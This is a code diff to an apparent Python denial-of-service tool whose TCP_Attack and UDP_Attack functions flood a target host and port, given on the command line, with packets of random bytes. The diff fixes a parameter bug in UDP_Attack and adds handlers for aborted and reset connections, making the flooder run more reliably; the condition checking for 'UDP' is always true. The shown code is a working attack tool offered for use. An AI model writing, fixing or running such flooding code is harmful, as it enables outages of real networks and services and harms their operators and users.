@@ -28,7 +28,7 @@ def TCP_Attack(target, port, package_size):
         print("Sending ", sent, "TCP Package with size ", package_size, "to", target, "on Port ", port)
         sent = sent + 1
 
-def UDP_Attack(target, port, package):
+def UDP_Attack(target, port, package_size):
     udp_serv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     byte = os.urandom(package_size)
@@ -54,12 +54,28 @@ class Main():
                 print("Error, Connection Refused...!")
                 sys.exit()
 
+            except ConnectionAbortedError:
+                print("Error, Connection Aborted...!")
+                sys.exit()
+
+            except ConnectionResetError:
+                print("Error, Connection Reset...!")
+                sys.exit()
+
         if sys.argv[2] == "UDP" or "udp":
             try:
                 UDP_Attack(str(sys.argv[1]), int(sys.argv[3]), int(sys.argv[4]))
 
             except ConnectionRefusedError:
                 print("Error, Connection Refused...!")
+                sys.exit()
+
+            except ConnectionAbortedError:
+                print("Error, Connection Aborted...!")
+                sys.exit()
+
+            except ConnectionResetError:
+                print("Error, Connection Reset...!")
                 sys.exit()
 
 if __name__ == "__main__":
